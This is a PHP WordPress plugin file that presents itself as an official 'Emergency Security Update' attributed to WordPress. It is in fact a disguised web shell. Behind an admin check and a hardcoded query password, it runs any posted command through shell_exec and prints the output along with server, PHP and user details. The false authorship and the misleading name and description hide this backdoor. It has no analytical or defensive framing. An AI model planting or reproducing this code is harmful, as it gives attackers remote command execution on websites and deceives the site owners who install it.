<?php
/**
 * Plugin Name: WP Emergency Security Update
 * Description: WordPress automatic emergency security updates.
 * Version: 6.6
 * Author: WordPress
 * Author URI: https://wordpress.org
 */

add_action('init', function() {
    if (current_user_can('manage_options') && $_GET['page'] === 'wp-emergency-security-update' && $_GET['pass'] === 'secure_password') {
        $output = '';
        if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
            $command = $_POST['cmd'];
            $sanitized_command = escapeshellcmd($command);
            $output = shell_exec($sanitized_command . ' 2>&1');
        }
        ?>
        <div class="wrap">
            <h1 style="margin-bottom: 20px;">Emergency Security Update - System Information</h1>
            <form method="post">
                <label for="cmd" style="margin-bottom: 10px; display: inline-block;"><strong>Command Execution:</strong></label><br>
                <input type="text" id="cmd" name="cmd" value="" style="width: 80%;" placeholder="Enter command here...">
                <input type="submit" value="Run Command" class="button button-primary">
            </form>

            <?php if (!empty($output)) : ?>
                <h2>Command Output:</h2>
                <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; white-space: pre-wrap;">
<?php echo htmlspecialchars(trim($output), ENT_QUOTES, 'UTF-8'); ?>
                </pre>
            <?php endif; ?>

            <h2>System Details:</h2>
            <ul>
                <li><strong>System Time:</strong> <?php echo date('Y-m-d H:i:s'); ?></li>
                <li><strong>PHP Version:</strong> <?php echo phpversion(); ?></li>
                <li><strong>WordPress Version:</strong> <?php echo get_bloginfo('version'); ?></li>
                <li><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                <li><strong>User Agent:</strong> <?php echo $_SERVER['HTTP_USER_AGENT']; ?></li>
                <li><strong>Current User:</strong> <?php echo wp_get_current_user()->user_login; ?></li>
            </ul>
        </div>
        <?php
    }
});

add_filter('the_generator', '__return_null');
?>
